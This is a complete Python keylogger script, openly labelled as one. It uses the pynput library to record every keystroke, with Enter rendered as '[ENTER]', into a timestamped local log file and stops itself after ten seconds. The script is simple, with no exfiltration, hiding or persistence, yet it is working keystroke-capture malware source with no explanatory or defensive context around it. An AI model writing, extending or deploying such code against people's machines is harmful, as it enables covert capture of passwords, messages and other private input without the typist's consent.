from pynput import keyboard
from threading import Timer
import sys
import datetime


def get_char(key):
    try:
        return key.char
    except AttributeError:
        return str(key)


def on_press(key):
    print(key)
    if str(key) == "Key.enter":
            key = "[ENTER]\n"
    with open(filename, 'a') as logs:
        logs.write(get_char(key))


def stop_logging():
    print("Exiting keylogger...")
    sys.exit()


def start_keylogger():
    now = datetime.datetime.now()
    timestamp = now.strftime("%Y-%m-%d_%H-%M-%S")
    global filename
    filename = f"keylogs_{timestamp}.txt"

    listener = keyboard.Listener(
        on_press=on_press,
    )
    listener.start()

    # Schedule the stop_logging function to run after 10 seconds
    timer = Timer(10, stop_logging)
    timer.start()


if __name__ == '__main__':
    start_keylogger()
